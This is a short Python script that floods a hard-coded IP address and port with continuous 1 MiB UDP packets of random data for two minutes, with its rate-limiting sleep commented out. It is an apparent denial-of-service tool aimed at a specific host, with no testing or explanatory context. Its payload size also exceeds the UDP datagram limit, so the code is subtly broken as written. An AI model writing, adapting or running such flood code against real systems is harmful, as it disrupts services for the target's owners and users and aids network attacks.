import asyncio, os


class UDPClient(asyncio.DatagramProtocol):
    pass


async def worker(ip, port):
    loop = asyncio.get_running_loop()

    transport, _ = await loop.create_datagram_endpoint(
        UDPClient,
        remote_addr=(ip, port)
    )
    try:
        while True:
            data = os.urandom(1 * 1024 * 1024)
            transport.sendto(data)
            # await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        transport.close()
        print("Task cancelled")
        raise


async def main(ip, port, duration):
    task = asyncio.create_task(worker(ip, port))

    await asyncio.sleep(duration)
    task.cancel()

    try:
        await task
    except asyncio.CancelledError:
        pass

    print("Done")

ip = "91.108.17.36"
port = 32002
duration = 120
asyncio.run(main(ip, port, duration))
